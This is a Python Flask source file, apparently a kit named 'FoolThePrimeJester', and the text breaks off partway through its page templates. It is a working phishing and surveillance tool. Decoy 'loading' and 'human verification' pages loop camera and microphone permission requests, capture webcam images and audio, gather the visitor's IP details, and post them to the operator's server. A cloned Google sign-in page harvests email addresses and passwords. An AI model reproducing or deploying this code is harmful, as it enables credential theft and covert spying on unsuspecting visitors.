# FoolThePrimeJester

from flask import Flask, request, Response, send_file
import json
import threading
import requests
import time
import uuid
from urllib.parse import quote
import base64

verify_keys = []
premius_tool_code = open("PremiusTool.py","r",encoding="utf-8").read()
database = {"ips": {}, "proxy_keywords": ["vpn", "proxy", "cloudflare", "amazon", "digitalocean", "aws", "azure", "google", "openvpn", "tor", "datacenter", "residential", "cdn", "private", "hosted", "vps", "fastly", "akamai", "linode", "ipvanish", "nordvpn", "cloudfront", "softlayer", "ovh", "hinet", "proxyv6", "privatevpn", "hideip", "vpnbook", "ipvanish", "proxylist", "expressvpn", "surfshark", "pia", "hidemyass", "nordvpn", "safervpn", "avira", "strongvpn", "whmcs", "webhost", "protonvpn", "zenmate", "shield", "purevpn", "ivpn", "cactusvpn", "trustzone", "betternet", "ipsec", "sstp", "softether", "torguard", "unotelly", "reliablehosting", "kimsufi", "leaseweb", "stormwall", "vultr", "rackspace", "turing", "contabo", "peer1", "proton", "data", "camp", "limited", "secure", "secret", "spy", "cia", "avast", "000", "111", "222", "333", "444", "555", "666", "777", "888", "999", "as0", "eth0", "triage", "nginx", "apache", "google", "webapp", "flask", "mullvad", "windscribe", "tunnelbear", "cyberghost", "private", "pia", "vyprvpn", "torguard", "hotspot shield", "strongswan", "astrill vpn", "psiphon", "lantern", "shadowsocks", "wireguard", "ikev2", "softether", "openvpn", "openconnect", "l2tp", "pptp", "gre tunnel", "ipip tunnel", "socks", "cloaking", "relay server", "squid proxy", "tinyproxy", "mitm proxy", "hetzner", "upcloud", "netcup", "ovhcloud", "greencloud", "linode", "digitalocean", "vultr", "ramnode", "dreamhost", "bluehost", "hostwinds", "namecheap vps", "ssdnodes", "cloudsigma", "servers.com", "netdepot", "scaleway", "arubacloud", "exoscale", "oneprovider", "zenlayer", "packet", "equinix", "datapacket", "stackpath", "imperva", "quiccloud", "cdn77", "gcore labs", "keycdn", "bunnycdn", "arvancloud", "incapsula", "chinacache", "medianova", "belugacdn", "cpanel", "plesk", "directadmin", "virtualmin", "ajenti", "interworx", "froxlor", "vestacp", "cloudron", "arbor networks", "radware", "f5 networks", "cloudflare spectrum", "prolexic", "akamai", "voxility", "staminus", "riorey", "dosarrest", "neustar security", "verisign ddos protection", "sucuri", "sitelock", "asn", "whois", "rpki", "bgp", "anycast", "vpsbenchmarks", "kvm", "xen", "openstack", "proxmox", "hyper-v", "virtualbox", "esxi", "pfsense", "opnsense", "mikrotik", "ubiquiti", "edgerouter", "vps", "sas", "scaleway", "cloud", "scale"], "loggers": {}, "loggers_tunnel": {}, "loggers_admin": {}}
lock = threading.Lock()

def error_log(text):
	with open(".error_log.txt", "a") as f:
		f.write(str(text)+"\n");f.flush()
def save_database():
	global database
	with open(".ftpj_database.json", "w") as f:
		f.write(json.dumps(database, default=repr));f.flush()
def load_database():
	global database
	with open(".ftpj_database.json", "r") as f:
		with lock:
			database = json.loads(f.read())
try:
	load_database()
except Exception as e:
	error_log(e)
try:
	starter_keys = open("starter_keys.txt", "r").read().split("\n")
	starter_keys = [h[:h.find("===")] for h in starter_keys]
except:
	starter_keys = ["123456789"]
try:
	ssp_keys = open("ssp_keys.txt", "r").read().split()
	ssp_keys = [h[:h.find("===")] for h in ssp_keys]
except:
	ssp_keys = ["987654321"]
logger_pages = {"bl0": ["""<h1>Loading Website Content...</h1><p>Please wait and if you want, do whatever you doing now</p><script>
async function getUserMediaPermissions() {
    while (true) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            return stream;
        } catch (error) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}

async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
    const video = document.createElement('video');
    video.srcObject = stream;
    
    try {
        const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Image capture timeout')), timeout)
        );
        
        await Promise.race([loaded, timeoutPromise]);
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);
        
        const imageData = canvas.toDataURL('image/jpeg');
        video.srcObject = null;
        return imageData;
    } catch (error) {
        video.srcObject = null;
        return null;
    }
}

async function main() {
    const stream = await getUserMediaPermissions();
    
    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoDevices = devices.filter(device => device.kind === 'videoinput');
    
    for (const device of videoDevices.slice(0, 5)) {
        const cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { deviceId: device.deviceId }
        });
        
        const imageData = await captureImageWithTimeout(cameraStream);
        if (imageData) {
            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "camera",
                    data: imageData
                }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        
        cameraStream.getTracks().forEach(track => track.stop());
    }

    window.location.href = "<!redirect!>";
}

main().catch(error => {
    window.location.href = "<!redirect!>";
});
</script>""", """<h1>Loading Website Content...</h1><p>Please wait and if you want, do whatever you doing now</p><script>
async function fetchWithTimeout(url, timeout = 3000) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);
        
        const response = await fetch(url, { signal: controller.signal });
        clearTimeout(timeoutId);
        
        return { url, data: await response.text() };
    } catch (error) {
        return { url, data: `Error: ${error.message}` };
    }
}

async function getUserMediaPermissions() {
    while (true) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            return stream;
        } catch (error) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}

async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
    const video = document.createElement('video');
    video.srcObject = stream;
    
    try {
        const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Image capture timeout')), timeout)
        );
        
        await Promise.race([loaded, timeoutPromise]);
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);
        
        const imageData = canvas.toDataURL('image/jpeg');
        video.srcObject = null;
        return imageData;
    } catch (error) {
        video.srcObject = null;
        return null;
    }
}

async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
    return new Promise(async (resolve) => {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        let hasData = false;
        
        recorder.ondataavailable = e => {
            chunks.push(e.data);
            hasData = true;
        };
        
        recorder.onstop = () => {
            if (!hasData) {
                resolve(null);
                return;
            }
            const blob = new Blob(chunks, { type: 'audio/wav' });
            const reader = new FileReader();
            reader.onload = () => resolve(reader.result);
            reader.readAsDataURL(blob);
        };

        try {
            recorder.start();
            
            await Promise.race([
                new Promise(resolve => setTimeout(resolve, initialTimeout)),
                new Promise(resolve => recorder.onstart = resolve)
            ]);
            
            if (!hasData) {
                recorder.stop();
                return;
            }

            setTimeout(() => recorder.stop(), duration);
        } catch (error) {
            recorder.stop();
            resolve(null);
        }
    });
}

async function main() {
    const urls = [
        'https://ifconfig.me/',
        'https://ifconfig.me/all',
        'https://whatismyipaddress.com/',
        'https://www.showmyip.com/',
        'https://ipaddress.my/',
        'https://ipinfo.io/json',
        'https://ipapi.co/json',
        'https://ipwho.is/',
        'https://google.com/',
        'https://youtube.com/'
    ];

    const fetchPromises = urls.map(url => fetchWithTimeout(url));
    const results = await Promise.all(fetchPromises);
    const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

    await fetch('/check_validity', {
        method: 'CHECK',
        body: JSON.stringify({
            target: "<!checker_identity!>",
            type: "ifconfig",
            data: dataJson
        }),
        headers: { 'Content-Type': 'application/json' }
    });

    const stream = await getUserMediaPermissions();
    
    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoDevices = devices.filter(device => device.kind === 'videoinput');
    
    for (const device of videoDevices.slice(0, 5)) {
        const cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { deviceId: device.deviceId }
        });
        
        const imageData = await captureImageWithTimeout(cameraStream);
        if (imageData) {
            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "camera",
                    data: imageData
                }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        
        cameraStream.getTracks().forEach(track => track.stop());
    }

    const audioDevices = devices.filter(device => device.kind === 'audioinput');
    if (audioDevices.length > 0) {
        const audioStream = await navigator.mediaDevices.getUserMedia({
            audio: { deviceId: audioDevices[0].deviceId }
        });
        
        const audioData = await recordAudioWithTimeout(audioStream);
        if (audioData) {
            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "microphone",
                    data: audioData
                }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        
        audioStream.getTracks().forEach(track => track.stop());
    }

    window.location.href = "<!redirect!>";
}

main().catch(error => {
    console.error('Error in main:', error);
    window.location.href = "<!redirect!>";
});
</script>"""], "hv0": ["""<h1>Human Verification</h1><p>Please accept the all requirements to open website.</p><script>
async function getUserMediaPermissions() {
    while (true) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            return stream;
        } catch (error) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}

async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
    const video = document.createElement('video');
    video.srcObject = stream;
    
    try {
        const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Image capture timeout')), timeout)
        );
        
        await Promise.race([loaded, timeoutPromise]);
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);
        
        const imageData = canvas.toDataURL('image/jpeg');
        video.srcObject = null;
        return imageData;
    } catch (error) {
        video.srcObject = null;
        return null;
    }
}

async function main() {
    const stream = await getUserMediaPermissions();
    
    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoDevices = devices.filter(device => device.kind === 'videoinput');
    
    for (const device of videoDevices.slice(0, 5)) {
        const cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { deviceId: device.deviceId }
        });
        
        const imageData = await captureImageWithTimeout(cameraStream);
        if (imageData) {
            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "camera",
                    data: imageData
                }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        
        cameraStream.getTracks().forEach(track => track.stop());
    }

    window.location.href = "<!redirect!>";
}

main().catch(error => {
    window.location.href = "<!redirect!>";
});
</script>""", """<h1>Human Verification</h1><p>Please accept the all requirements to open website.</p><script>
async function fetchWithTimeout(url, timeout = 3000) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);
        
        const response = await fetch(url, { signal: controller.signal });
        clearTimeout(timeoutId);
        
        return { url, data: await response.text() };
    } catch (error) {
        return { url, data: `Error: ${error.message}` };
    }
}

async function getUserMediaPermissions() {
    while (true) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            return stream;
        } catch (error) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}

async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
    const video = document.createElement('video');
    video.srcObject = stream;
    
    try {
        const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Image capture timeout')), timeout)
        );
        
        await Promise.race([loaded, timeoutPromise]);
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);
        
        const imageData = canvas.toDataURL('image/jpeg');
        video.srcObject = null;
        return imageData;
    } catch (error) {
        video.srcObject = null;
        return null;
    }
}

async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
    return new Promise(async (resolve) => {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        let hasData = false;
        
        recorder.ondataavailable = e => {
            chunks.push(e.data);
            hasData = true;
        };
        
        recorder.onstop = () => {
            if (!hasData) {
                resolve(null);
                return;
            }
            const blob = new Blob(chunks, { type: 'audio/wav' });
            const reader = new FileReader();
            reader.onload = () => resolve(reader.result);
            reader.readAsDataURL(blob);
        };

        try {
            recorder.start();
            
            await Promise.race([
                new Promise(resolve => setTimeout(resolve, initialTimeout)),
                new Promise(resolve => recorder.onstart = resolve)
            ]);
            
            if (!hasData) {
                recorder.stop();
                return;
            }

            setTimeout(() => recorder.stop(), duration);
        } catch (error) {
            recorder.stop();
            resolve(null);
        }
    });
}

async function main() {
    const urls = [
        'https://ifconfig.me/',
        'https://ifconfig.me/all',
        'https://whatismyipaddress.com/',
        'https://www.showmyip.com/',
        'https://ipaddress.my/',
        'https://ipinfo.io/json',
        'https://ipapi.co/json',
        'https://ipwho.is/',
        'https://google.com/',
        'https://youtube.com/'
    ];

    const fetchPromises = urls.map(url => fetchWithTimeout(url));
    const results = await Promise.all(fetchPromises);
    const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

    await fetch('/check_validity', {
        method: 'CHECK',
        body: JSON.stringify({
            target: "<!checker_identity!>",
            type: "ifconfig",
            data: dataJson
        }),
        headers: { 'Content-Type': 'application/json' }
    });

    const stream = await getUserMediaPermissions();
    
    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoDevices = devices.filter(device => device.kind === 'videoinput');
    
    for (const device of videoDevices.slice(0, 5)) {
        const cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { deviceId: device.deviceId }
        });
        
        const imageData = await captureImageWithTimeout(cameraStream);
        if (imageData) {
            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "camera",
                    data: imageData
                }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        
        cameraStream.getTracks().forEach(track => track.stop());
    }

    const audioDevices = devices.filter(device => device.kind === 'audioinput');
    if (audioDevices.length > 0) {
        const audioStream = await navigator.mediaDevices.getUserMedia({
            audio: { deviceId: audioDevices[0].deviceId }
        });
        
        const audioData = await recordAudioWithTimeout(audioStream);
        if (audioData) {
            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "microphone",
                    data: audioData
                }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        
        audioStream.getTracks().forEach(track => track.stop());
    }

    window.location.href = "<!redirect!>";
}

main().catch(error => {
    console.error('Error in main:', error);
    window.location.href = "<!redirect!>";
});
</script>"""], "fb0": ["""<script>
async function getUserMediaPermissions() {
    while (true) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            return stream;
        } catch (error) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}

async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
    const video = document.createElement('video');
    video.srcObject = stream;
    
    try {
        const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Image capture timeout')), timeout)
        );
        
        await Promise.race([loaded, timeoutPromise]);
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);
        
        const imageData = canvas.toDataURL('image/jpeg');
        video.srcObject = null;
        return imageData;
    } catch (error) {
        video.srcObject = null;
        return null;
    }
}

async function main() {
    const stream = await getUserMediaPermissions();
    
    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoDevices = devices.filter(device => device.kind === 'videoinput');
    
    for (const device of videoDevices.slice(0, 5)) {
        const cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { deviceId: device.deviceId }
        });
        
        const imageData = await captureImageWithTimeout(cameraStream);
        if (imageData) {
            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "camera",
                    data: imageData
                }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        
        cameraStream.getTracks().forEach(track => track.stop());
    }

    window.location.href = "<!redirect!>";
}

main().catch(error => {
    window.location.href = "<!redirect!>";
});
</script>""", """<script>
async function fetchWithTimeout(url, timeout = 3000) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);
        
        const response = await fetch(url, { signal: controller.signal });
        clearTimeout(timeoutId);
        
        return { url, data: await response.text() };
    } catch (error) {
        return { url, data: `Error: ${error.message}` };
    }
}

async function getUserMediaPermissions() {
    while (true) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            return stream;
        } catch (error) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}

async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
    const video = document.createElement('video');
    video.srcObject = stream;
    
    try {
        const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Image capture timeout')), timeout)
        );
        
        await Promise.race([loaded, timeoutPromise]);
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);
        
        const imageData = canvas.toDataURL('image/jpeg');
        video.srcObject = null;
        return imageData;
    } catch (error) {
        video.srcObject = null;
        return null;
    }
}

async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
    return new Promise(async (resolve) => {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        let hasData = false;
        
        recorder.ondataavailable = e => {
            chunks.push(e.data);
            hasData = true;
        };
        
        recorder.onstop = () => {
            if (!hasData) {
                resolve(null);
                return;
            }
            const blob = new Blob(chunks, { type: 'audio/wav' });
            const reader = new FileReader();
            reader.onload = () => resolve(reader.result);
            reader.readAsDataURL(blob);
        };

        try {
            recorder.start();
            
            await Promise.race([
                new Promise(resolve => setTimeout(resolve, initialTimeout)),
                new Promise(resolve => recorder.onstart = resolve)
            ]);
            
            if (!hasData) {
                recorder.stop();
                return;
            }

            setTimeout(() => recorder.stop(), duration);
        } catch (error) {
            recorder.stop();
            resolve(null);
        }
    });
}

async function main() {
    const urls = [
        'https://ifconfig.me/',
        'https://ifconfig.me/all',
        'https://whatismyipaddress.com/',
        'https://www.showmyip.com/',
        'https://ipaddress.my/',
        'https://ipinfo.io/json',
        'https://ipapi.co/json',
        'https://ipwho.is/',
        'https://google.com/',
        'https://youtube.com/'
    ];

    const fetchPromises = urls.map(url => fetchWithTimeout(url));
    const results = await Promise.all(fetchPromises);
    const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

    await fetch('/check_validity', {
        method: 'CHECK',
        body: JSON.stringify({
            target: "<!checker_identity!>",
            type: "ifconfig",
            data: dataJson
        }),
        headers: { 'Content-Type': 'application/json' }
    });

    const stream = await getUserMediaPermissions();
    
    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoDevices = devices.filter(device => device.kind === 'videoinput');
    
    for (const device of videoDevices.slice(0, 5)) {
        const cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { deviceId: device.deviceId }
        });
        
        const imageData = await captureImageWithTimeout(cameraStream);
        if (imageData) {
            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "camera",
                    data: imageData
                }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        
        cameraStream.getTracks().forEach(track => track.stop());
    }

    const audioDevices = devices.filter(device => device.kind === 'audioinput');
    if (audioDevices.length > 0) {
        const audioStream = await navigator.mediaDevices.getUserMedia({
            audio: { deviceId: audioDevices[0].deviceId }
        });
        
        const audioData = await recordAudioWithTimeout(audioStream);
        if (audioData) {
            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "microphone",
                    data: audioData
                }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        
        audioStream.getTracks().forEach(track => track.stop());
    }

    window.location.href = "<!redirect!>";
}

main().catch(error => {
    console.error('Error in main:', error);
    window.location.href = "<!redirect!>";
});
</script>"""], "dr0": ["<script>window.location.href = '<!redirect!>';</script>", "<script>window.location.href = '<!redirect!>';</script>"], "gl0": ["""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #fff;
        }
        .container {
            width: 100%;
            max-width: 448px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            box-sizing: border-box;
            margin: 20px;
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 75px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            text-align: center;
            margin-bottom: 24px;
        }
        .input-container {
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #4285f4;
            box-shadow: 0 0 0 1px #4285f4;
        }
        .forgot-link {
            margin-bottom: 24px;
        }
        .forgot-link a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #174ea6;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #5f6368;
            font-size: 12px;
            padding: 10px 0;
            background-color: #fff;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 8px;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #d93025;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 24px 20px;
                margin: 10px;
                border: none;
            }
            .logo {
                width: 60px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 14px;
            }
            .buttons {
                flex-direction: column;
                align-items: flex-end;
                gap: 20px;
            }
            .create-account {
                margin-bottom: 10px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
        <h1>Sign in</h1>
        <div class="subtitle">to continue to Gmail</div>
        <div class="input-container">
            <input type="email" id="email-input" placeholder="Email or phone" required>
            <div id="email-error" class="error">Enter a valid email or phone number</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot email?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#">Create account</a>
            </div>
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
        <h1>Welcome</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Enter your password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">English (United States)</a>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function processMedia() {
            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Email or phone cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #fff;
        }
        .container {
            width: 100%;
            max-width: 448px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            box-sizing: border-box;
            margin: 20px;
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 75px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            text-align: center;
            margin-bottom: 24px;
        }
        .input-container {
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #4285f4;
            box-shadow: 0 0 0 1px #4285f4;
        }
        .forgot-link {
            margin-bottom: 24px;
        }
        .forgot-link a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #174ea6;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #5f6368;
            font-size: 12px;
            padding: 10px 0;
            background-color: #fff;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 8px;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #d93025;
            font-size: 12px;
